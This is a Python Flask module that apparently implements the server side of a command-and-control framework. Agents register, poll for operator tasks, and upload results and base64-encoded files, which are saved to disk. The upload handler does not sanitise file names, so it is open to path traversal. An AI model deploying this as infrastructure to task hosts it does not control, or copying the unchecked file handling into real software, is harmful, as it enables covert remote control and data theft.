import time
import json
import base64
import os
import uuid
from functools import wraps
from flask import request, jsonify, Response
from queue import Queue
from lib.config import agents, tasks, results, result_queues, AUTH_KEY, AGENT_TIMEOUT

# Helpers
def auth_check(req):
    return req.headers.get("Authorization") == f"Bearer {AUTH_KEY}"

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not auth_check(request):
            return Response("Unauthorized", 401)
        return f(*args, **kwargs)
    return decorated

def timestamp():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def get_agent(agent_id):
    agent = agents.get(agent_id)
    if not agent:
        return None, ("Unknown agent", 404)
    return agent, None

def save_file(agent_id, filename, b64data):
    data = base64.b64decode(b64data)
    downloads = os.path.join(os.path.expanduser("~"), "Downloads", agent_id)
    os.makedirs(downloads, exist_ok=True)
    path = os.path.join(downloads, filename)
    with open(path, "wb") as f:
        f.write(data)
    return path

# Routes
def create_routes(app):

    @app.route("/register", methods=["POST"])
    @require_auth
    def register():
        aid = str(uuid.uuid4())
        now = time.time()

        agents[aid] = {"registered_at": timestamp(), "last_seen": now}
        tasks[aid] = Queue()
        results[aid] = []
        result_queues[aid] = Queue()

        return jsonify({"agent_id": aid})

    @app.route("/task/<agent_id>", methods=["GET"])
    @require_auth
    def get_task(agent_id):
        agent, err = get_agent(agent_id)
        if err:
            return err

        agent["last_seen"] = time.time()

        if not tasks[agent_id].empty():
            try:
                return jsonify({"task": tasks[agent_id].get(timeout=0.1)})
            except:
                return jsonify({"task": None})

        return jsonify({"task": None})

    @app.route("/task/<agent_id>", methods=["POST"])
    @require_auth
    def post_task(agent_id):
        agent, err = get_agent(agent_id)
        if err:
            return err

        if time.time() - agent["last_seen"] > AGENT_TIMEOUT:
            return "Agent offline", 400

        tasks[agent_id].put(request.data.decode())
        return "OK", 200

    @app.route("/result/<agent_id>", methods=["POST"])
    @require_auth
    def receive_result(agent_id):
        agent, err = get_agent(agent_id)
        if err:
            return err

        raw = request.data.decode()
        readable = raw

        try:
            parsed = json.loads(raw)
            if parsed.get("type", "") == "file":
                saved = save_file(agent_id, parsed["filename"], parsed["data"])
                readable = f"[FILE SAVED] {saved}"
        except:
            pass  # leave readable as raw if not JSON

        entry = {"timestamp": timestamp(), "result": readable}
        results[agent_id].append(entry)
        result_queues[agent_id].put(entry)

        return "OK", 200

    @app.route("/agents", methods=["GET"])
    @require_auth
    def list_agents():
        live = [
            aid for aid, info in agents.items()
            if time.time() - info.get("last_seen", 0) <= AGENT_TIMEOUT
        ]
        return jsonify({"agents": live})

    @app.route("/history/<agent_id>", methods=["GET"])
    @require_auth
    def history(agent_id):
        agent, err = get_agent(agent_id)
        if err:
            return err
        return jsonify({"results": results[agent_id]})
